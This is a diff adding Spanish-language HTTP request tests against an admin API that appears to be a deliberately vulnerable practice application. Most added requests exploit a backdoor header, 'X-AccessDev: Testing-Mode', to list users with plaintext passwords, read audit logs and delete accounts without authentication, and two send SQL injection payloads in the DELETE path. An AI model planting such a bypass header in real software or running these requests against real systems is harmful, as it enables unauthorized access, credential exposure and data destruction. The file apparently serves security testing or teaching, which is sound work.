@@ -99,6 +99,158 @@ GET {{apiUrl}}/admin/audit-logs
 ### TESTS CON TOKEN INVÁLIDO
 ### =====================================================
 
+### 14. Token inválido - admin/users
+GET {{apiUrl}}/admin/users
+Authorization: Bearer invalid.token.here
+
+### 15. Token malformado - admin/stats
+GET {{apiUrl}}/admin/stats
+Authorization: Bearer malformed_token
+
+### 16. Token expirado (simular)
+GET {{apiUrl}}/admin/users
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1MTYyMzkwMjJ9.expired
+
+### =====================================================
+### BACKDOOR - ACCESO SIN AUTENTICACIÓN
+### =====================================================
+### ⚠️ El header X-AccessDev: Testing-Mode bypasea TODA autenticación
+
+### 17. Backdoor - Get All Users (SIN token)
+GET {{apiUrl}}/admin/users
+X-AccessDev: Testing-Mode
+
+### 18. Backdoor - Get Stats (SIN token)
+GET {{apiUrl}}/admin/stats
+X-AccessDev: Testing-Mode
+
+### 19. Backdoor - Get Audit Logs (SIN token)
+GET {{apiUrl}}/admin/audit-logs?limit=20
+X-AccessDev: Testing-Mode
+
+### 20. Backdoor - Delete User (SIN token) ⚠️ PELIGROSO
+DELETE {{apiUrl}}/admin/users/8
+X-AccessDev: Testing-Mode
+
+### =====================================================
+### COMBINACIÓN: Backdoor + Token válido (redundante)
+### =====================================================
+
+### 21. Backdoor + Token admin (ambos válidos)
+GET {{apiUrl}}/admin/users
+Authorization: Bearer {{token}}
+X-AccessDev: Testing-Mode
+
+### 22. Backdoor con token inválido (backdoor tiene prioridad)
+GET {{apiUrl}}/admin/users
+Authorization: Bearer invalid_token
+X-AccessDev: Testing-Mode
+
+### =====================================================
+### ENUMERACIÓN DE USUARIOS
+### =====================================================
+
+### 23. Listar todos los usuarios
+GET {{apiUrl}}/admin/users
+X-AccessDev: Testing-Mode
+
+### Respuesta esperada revela:
+### - Usernames
+### - Emails  
+### - Roles (admin/user)
+### - Passwords en texto plano!
+### - Login attempts
+### - Last login timestamps
+
+### 24. Ver estadísticas de la base de datos
+GET {{apiUrl}}/admin/stats
+X-AccessDev: Testing-Mode
+
+### Revela:
+### - Total de usuarios
+### - Total de productos
+### - Total de órdenes
+### - Usuarios por rol
+### - Productos por categoría
+
+### =====================================================
+### AUDIT LOG - ANÁLISIS DE ACTIVIDAD
+### =====================================================
+
+### 25. Ver últimos 10 eventos
+GET {{apiUrl}}/admin/audit-logs?limit=10
+X-AccessDev: Testing-Mode
+
+### 26. Ver últimos 50 eventos
+GET {{apiUrl}}/admin/audit-logs?limit=50
+X-AccessDev: Testing-Mode
+
+### 27. Ver últimos 100 eventos (máximo recomendado)
+GET {{apiUrl}}/admin/audit-logs?limit=100
+X-AccessDev: Testing-Mode
+
+### Tipos de eventos registrados:
+### - login_success
+### - login_failed
+### - backdoor_access ← detecta uso del backdoor
+### - user_deleted
+### - user_created
+
+### =====================================================
+### ELIMINACIÓN DE USUARIOS - ⚠️ OPERACIONES PELIGROSAS
+### =====================================================
+
+### 28. Eliminar usuario guest (ID 6)
+DELETE {{apiUrl}}/admin/users/6
+X-AccessDev: Testing-Mode
+
+### 29. Eliminar usuario test (ID 5)
+DELETE {{apiUrl}}/admin/users/5
+X-AccessDev: Testing-Mode
+
+### 30. Intentar eliminar admin (ID 1) - NO RECOMENDADO
+# DELETE {{apiUrl}}/admin/users/1
+# X-AccessDev: Testing-Mode
+
+### 31. Intentar eliminar usuario inexistente
+DELETE {{apiUrl}}/admin/users/999
+X-AccessDev: Testing-Mode
+
+### =====================================================
+### SQL INJECTION EN DELETE USER (si existe)
+### =====================================================
+
+### 32. SQLi en DELETE - Intentar eliminar múltiples usuarios
+DELETE {{apiUrl}}/admin/users/1' OR '1'='1
+X-AccessDev: Testing-Mode
+
+### 33. SQLi en DELETE - Eliminar por rol
+DELETE {{apiUrl}}/admin/users/1' OR role='user' --
+X-AccessDev: Testing-Mode
+
+### =====================================================
+### RESUMEN DE ENDPOINTS ADMIN
+### =====================================================
+###
+### ✅ Endpoints disponibles:
+### GET  /api/admin/users          - Lista todos los usuarios
+### GET  /api/admin/stats          - Estadísticas de DB
+### GET  /api/admin/audit-logs     - Logs de auditoría
+### DELETE /api/admin/users/:id    - Eliminar usuario
+###
+### 🔐 Autenticación:
+### - Opción 1: Token JWT de admin (obtener via /api/auth/login)
+### - Opción 2: Header X-AccessDev: Testing-Mode (BACKDOOR)
+###
+### ⚠️ Vulnerabilidades:
+### - Backdoor bypasea toda autenticación
+### - Passwords expuestas en texto plano
+### - Sin rate limiting
+### - Información sensible en respuestas
+### - Posible SQLi en DELETE endpoint
+###
+### =====================================================
+
 ### 14. Token malformado
 GET {{apiUrl}}/admin/users
 Authorization: Bearer token_invalido_123
